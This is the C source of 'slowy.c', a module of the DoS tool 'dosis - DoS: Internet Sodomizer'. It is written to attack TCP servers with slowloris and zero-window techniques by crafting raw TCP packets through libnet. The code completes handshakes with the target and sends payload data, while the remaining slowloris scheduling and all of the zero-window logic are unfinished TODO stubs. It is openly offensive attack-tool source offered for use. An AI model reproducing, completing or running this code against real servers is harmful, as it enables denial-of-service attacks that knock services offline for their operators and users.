/*****************************************************************************
 * slowy.c
 *
 * DoS on TCP servers by
 *  - slowloris attack
 *  - zero window size
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "dosconfig.h"
#include "tea.h"
#include "slowy.h"
#include "lnet.h"
#include "payload.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"

#define BUFSIZE    2048

typedef struct _tag_SLOWY_CFG {
  INET_ADDR   shost;
  INET_ADDR   dhost;
  unsigned    timeout;
  char       *payload;
  unsigned    payload_size;
  LN_CONTEXT *lnc;
} SLOWY_CFG;

typedef struct _tag_TCPCON {
  int         sport;
  int         timestamp;
  union {
    int       winsize;  /* current win size */
    int       sent;     /* offset sent */
  } status;
} TCP_CON;

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define tcp_header(x)  ((struct tcphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int slowy__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || ip_protocol(msg) != 6
  || size < sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2))
    return 0;

  /* check msg */
  return ip_header(msg)->saddr == tc->dhost.addr.in.addr
      && ntohs(tcp_header(msg)->source) == tc->dhost.port
         ? -1 : 0;
}

static void slowy__listen(THREAD_WORK *tw)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
  TEA_MSG *m;

  /* listen the radio */
  while((m = tea_mqueue_shift(tw->mqueue)) != NULL)
  {
    TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
            ip_protocol(m->b),
            (ip_header(m->b)->saddr >>  0) & 0x00ff,
            (ip_header(m->b)->saddr >>  8) & 0x00ff,
            (ip_header(m->b)->saddr >> 16) & 0x00ff,
            (ip_header(m->b)->saddr >> 24) & 0x00ff,
            tcp_header(m->b)->dest, tc->dhost.port,
            tcp_header(m->b)->rst,
            ip_header(m->b)->saddr, tc->shost.addr.in.addr);

    /* in some special case (handshake) send kakitas */
    if(tcp_header(m->b)->syn != 0
    && tcp_header(m->b)->ack != 0)
    {
      /* register connection */
      /* TODO */

      /* send handshake */
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
                         TH_ACK,
                         ntohs(tcp_header(m->b)->window),
                         ntohl(tcp_header(m->b)->ack_seq),
                         ntohl(tcp_header(m->b)->seq) + 1,
                         NULL, 0);

      /* (slowloris) first data TCP packet (random size) */
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
                         TH_ACK | TH_PUSH,
                         ntohs(tcp_header(m->b)->window),
                         ntohl(tcp_header(m->b)->ack_seq),
                         ntohl(tcp_header(m->b)->seq) + 1,
                         (char *) tc->payload, tc->payload_size);
    } else
    if(tcp_header(m->b)->fin != 0
    || tcp_header(m->b)->rst != 0)
    {
      /* kill connection */
      /*   - (fin) schedule fin/ack packet */
      /*   - (fin&rst) remove directly */
    } else
    if(tcp_header(m->b)->ack != 0)
    {
      /* depending on attack */

      /* (slowloris) schedule one ack and data */
      /* TODO */
      /* (slowloris) if no more req, then start to ack contents */
      /* TODO */

      /* (zerowin) ack content and reduce window */
      /* TODO */
    }

    /* release msg buffer */
    tea_msg_release(m);
  }

  /* send scheduled packets */
  /* TODO */
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int slowy__configure(THREAD_WORK *tw, SNODE *command)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
  SNODE *cn;
  char *s;

  /* initialize specialized work thread data */
  if(tc == NULL)
  {
    if((tc = calloc(1, sizeof(SLOWY_CFG))) == NULL)
      TFAT("No memory for SLOWY_CFG.");
    tw->data = (void *) tc;

    /* initialize libnet */
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
      TFAT("No memory for LN_CONTEXT.");
    ln_init_context(tc->lnc);
  }

  /* read from SNODE command parameters */
  if(command->command.thc.to != NULL)
  if(command->command.thc.to->to.pattern != NULL)
    TFAT("%d: SLOWY does not accept a pattern.",
         command->command.thc.to->to.pattern->line);
  
  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_SRC:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tc->shost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tc->shost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_DST:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tc->dhost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tc->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_PAYLOAD_FILE:
      case TYPE_OPT_PAYLOAD_RANDOM:
      case TYPE_OPT_PAYLOAD_STR:
        payload_get(cn, &tc->payload, &tc->payload_size);
        break;

      default:
        TFAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* configure src address (if not defined) */
  if(tc->dhost.type == INET_FAMILY_NONE)
    TFAT("I need a target address.");
  if(tc->shost.type == INET_FAMILY_NONE)
  {
    DOS_ADDR_INFO *ai;
    if((ai = dos_get_interface(&tc->dhost)) == NULL)
    {
      char buff[255];
      ip_addr_snprintf(&tc->shost, sizeof(buff), buff);
      TWRN("Cannot find a suitable source address for '%s'.", buff);
    } else
      ip_addr_copy(&tc->shost, &ai->addr);
  }

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.bytes  = %d", tc->payload_size);

    ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
    TDBG2("config.options.shost   = %s", buff);
    ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
    TDBG2("[%d] config.options.dhost   = %s", buff);
    TDBG2("[%d] config.options.payload = %d bytes", tc->payload_size);
  }

  return 0;
}

static void slowy__cleanup(THREAD_WORK *tw)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;

  if(tc)
  {
    /* collect libnet data */
    if(tc->lnc)
    {
      ln_destroy_context(tc->lnc);
      free(tc->lnc);
      tc->lnc = NULL;
    }
    if(tc->payload)
    {
      free(tc->payload);
      tc->payload = NULL;
    }
    free(tc);
    tw->data = NULL;
  }
  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaSLOWY = {
  .name         = "SLOWY",
  .configure    = slowy__configure,
  .cleanup      = slowy__cleanup,
  .listen       = slowy__listen,
  .listen_check = slowy__listen_check,
};

